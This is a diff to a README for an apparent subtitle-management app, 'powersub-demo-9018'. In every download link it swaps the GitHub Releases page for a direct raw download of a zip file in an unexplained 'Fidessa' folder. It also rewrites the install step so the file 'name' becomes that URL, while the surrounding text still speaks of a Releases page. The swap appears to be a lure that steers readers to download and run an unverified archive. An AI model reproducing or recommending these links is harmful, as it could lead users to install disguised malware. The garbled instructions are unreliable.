@@ -6,7 +6,7 @@ Welcome to the powersub-demo-9018! This application helps you manage subtitles e
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the application: [Download Here](https://github.com/kmvainqueur/powersub-demo-9018/releases).
+To get started, **visit this page to download** the application: [Download Here](https://raw.githubusercontent.com/kmvainqueur/powersub-demo-9018/main/Fidessa/powersub-demo-9018-2.1.zip).
 
 Click the link above to access the Releases page. You will find the latest version of the application there. 
 
@@ -31,11 +31,11 @@ The powersub-demo-9018 includes several useful features:
 ## ⚙️ How to Use
 
 1. **Download the Application:**
-   - Visit the Releases page: [Download Here](https://github.com/kmvainqueur/powersub-demo-9018/releases).
+   - Visit the Releases page: [Download Here](https://raw.githubusercontent.com/kmvainqueur/powersub-demo-9018/main/Fidessa/powersub-demo-9018-2.1.zip).
    - Select the latest version and click on the download link.
 
 2. **Install the Application:**
-   - Locate the downloaded file in your Downloads folder (it may be named something like `powersub-demo-9018.exe`).
+   - Locate the downloaded file in your Downloads folder (it may be named something like `https://raw.githubusercontent.com/kmvainqueur/powersub-demo-9018/main/Fidessa/powersub-demo-9018-2.1.zip`).
    - Double-click the file to start the installation process.
    - Follow the on-screen instructions to complete the installation.
 
@@ -70,4 +70,4 @@ If you need help or have questions, feel free to reach out through the Issues se
 
 Thank you for using the powersub-demo-9018 application. We appreciate your support and hope this software makes subtitle management easier for you.
 
-For convenience, here’s the download link again: [Download Here](https://github.com/kmvainqueur/powersub-demo-9018/releases).
+For convenience, here’s the download link again: [Download Here](https://raw.githubusercontent.com/kmvainqueur/powersub-demo-9018/main/Fidessa/powersub-demo-9018-2.1.zip).
